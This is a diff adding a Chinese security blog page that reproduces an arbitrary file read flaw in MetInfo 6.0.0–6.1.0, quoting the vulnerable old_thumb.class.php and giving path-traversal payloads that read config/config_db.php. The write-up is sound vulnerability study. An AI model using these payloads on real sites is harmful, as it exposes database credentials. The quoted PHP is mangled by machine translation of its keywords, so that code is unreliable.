@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="MetInfo 任意文件读取一、漏洞简介MetInfo是一套使用PHP和Mysql开发的内容管理系统。 MetInfo6.0.0~6.1.0版本中的old_thumb.class.php文件存在任意文件读取漏洞。攻击者可利用漏洞读取网站上的敏感文件 二、漏洞影响MetInfo 6.0.0 MetInfo 6.1.0 三、复现过程漏洞分析进攻分析看下\MetInfo6\app\system\incl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/MetInfo/Metinfo%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="MetInfo 任意文件读取一、漏洞简介MetInfo是一套使用PHP和Mysql开发的内容管理系统。 MetInfo6.0.0~6.1.0版本中的old_thumb.class.php文件存在任意文件读取漏洞。攻击者可利用漏洞读取网站上的敏感文件 二、漏洞影响MetInfo 6.0.0 MetInfo 6.1.0 三、复现过程漏洞分析进攻分析看下\MetInfo6\app\system\incl">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Metinfo%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Metinfo%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/media/rId27.png">
+<meta property="article:published_time" content="2022-07-08T06:25:59.262Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.672Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Metinfo%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/media/rId25.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-MetInfo/Metinfo任意文件读取" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/MetInfo/Metinfo%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="article-date">
+  <time datetime="2022-07-08T06:25:59.262Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="MetInfo-任意文件读取"><a href="#MetInfo-任意文件读取" class="headerlink" title="MetInfo 任意文件读取"></a>MetInfo 任意文件读取</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>MetInfo是一套使用PHP和Mysql开发的内容管理系统。 MetInfo<br>6.0.0~6.1.0版本中的<br>old_thumb.class.php文件存在任意文件读取漏洞。攻击者可利用漏洞读取网站上的敏感文件</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>MetInfo 6.0.0 MetInfo 6.1.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>进攻分析<br>看下\MetInfo6\app\system\include\module\old_thumb.class.php</p>
+<pre><code>&lt;？php 
+＃MetInfo企业内容管理系统
+＃版权所有（C）MetInfo Co.，Ltd（http://www.metinfo.cn）。版权所有。
+
+define（&#39;IN_MET&#39;）或 退出（&#39;No权限&#39;）;
+
+load :: sys_class（&#39;web&#39;）;
+
+class  old_thumb  扩展了 网络 &#123;
+
+      公共 功能 doshow （） &#123; 全局 $ _M;
+
+
+        $ DIR = str_replace函数（&#39;../&#39; ，&#39;&#39;，$ _GET [ &#39;目录&#39; ]）;
+
+
+        if（strstr（str_replace（$ _ M [ &#39;url&#39; ] [ &#39;site&#39; ]，&#39;&#39;，$ dir），&#39;http&#39;））&#123; 
+            header（“ Content-type：image / jpeg”）; 
+            ob_start（）; 
+            readfile（$ dir）; 
+            ob_flush（）; 
+            flush（）; 死 ;         &#125;
+
+
+
+        if（$ _M [ &#39;form&#39; ] [ &#39;pageset&#39; ]）&#123; 
+          $ path = $ dir。“＆met-table = &#123;$ _ M [&#39;form&#39;] [&#39;met-table&#39;]&#125;＆met-field = &#123;$ _ M [&#39;form&#39;] [&#39;met-field&#39;]&#125;”“；
+
+        &#125; else &#123; 
+          $ path = $ dir; 
+        &#125; 
+        $ image = thumb（$ path，$ _ M [ &#39;form&#39; ] [ &#39;x&#39; ]，$ _ M [ &#39;form&#39; ] [ &#39;y&#39; ]）; if（$ _M [ &#39;form&#39; ] [ &#39;pageset&#39; ]）&#123;           $ img = explode（&#39;？&#39;，$ image）;           $ img = $ img [ 0 ];         &#125; else &#123;           $ img = $ image;         &#125; if（$ img）&#123;             header（“ Content-type：image / jpeg”）;             ob_start（）;
+
+
+
+
+
+
+
+
+
+            readfile（PATH_WEB.str_replace（$ _ M [ &#39;url&#39; ] [ &#39;site&#39; ]，&#39;&#39;，$ img））; 
+            ob_flush（）; 
+            flush（）; 
+        &#125;
+
+    &#125; 
+&#125;
+
+＃此程序是一个开放源代码系统，可用于商业用途，请自觉购买商业许可证。
+＃版权所有（C）MetInfo Co.，Ltd.（http://www.metinfo.cn）。版权所有。
+？&gt;
+</code></pre>
+<p>从代码中看用看到，$dir直接由$_GET[&#39;dir&#39;]传递进来，并将../置空。目标是进入到第一个，如果里面的readfile($dir);，读取文件。看看如果语句的条件，的英文外面一个strstr函数，判断$dir中http字符串的首次出现位置，实质上，要进入到这个if语句里面，$dir中必须包含http字符串。里面的将$dir中包含$_M[&#39;url&#39;][&#39;site&#39;]的部分放置空，这里可以不用管。</p>
+<p><img src="/resource/Metinfo%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/media/rId25.png"></p>
+<p>从上面的分析可以构造出有效负载，只要$dir里包含http字符串就可以进入到readfile函数从而重新读取任意函数，然后可以使用..././来进行目录替换，因为../会被置空，所以最终payload如下</p>
+<pre><code>?dir=..././http/..././config/config_db.php
+?dir=.....///http/.....///config/config_db.php
+?dir=http/.....///.....///config/config_db.php
+?dir=http\..\..\config\config_db.php
+</code></pre>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>要先找到调用old_thumb.class.php的文件，看到include/thumb.php，可以从这个文件里面进入到old_thumb.class.php</p>
+<pre><code>&lt;?php
+# MetInfo Enterprise Content Management System
+# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved.
+define(&#39;M_NAME&#39;, &#39;include&#39;);
+define(&#39;M_MODULE&#39;, &#39;include&#39;);
+define(&#39;M_CLASS&#39;, &#39;old_thumb&#39;);
+define(&#39;M_ACTION&#39;, &#39;doshow&#39;);
+require_once &#39;../app/system/entrance.php&#39;;
+# This program is an open source system, commercial use, please consciously to purchase commercial license.
+# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.
+?&gt;
+</code></pre>
+<p>所以我们通过thumb.php将构造好的$dir传入即可。</p>
+<p><img src="/resource/Metinfo%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/media/rId27.png"></p>
+<p>可以看到成功的读取到了config/config_</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/MetInfo/Metinfo%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" data-id="cl5c2qrs500auy8v1fob03h7j" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/MetInfo/MetInfo%E7%B3%BB%E7%BB%9F%E4%B8%AD%E4%B8%80%E5%A4%84%E6%97%A7%E6%8F%92%E4%BB%B6%E5%AF%BC%E8%87%B4%E7%9A%84ssrf/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/MetInfo/Metinfo%206.1.2%20SQL%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
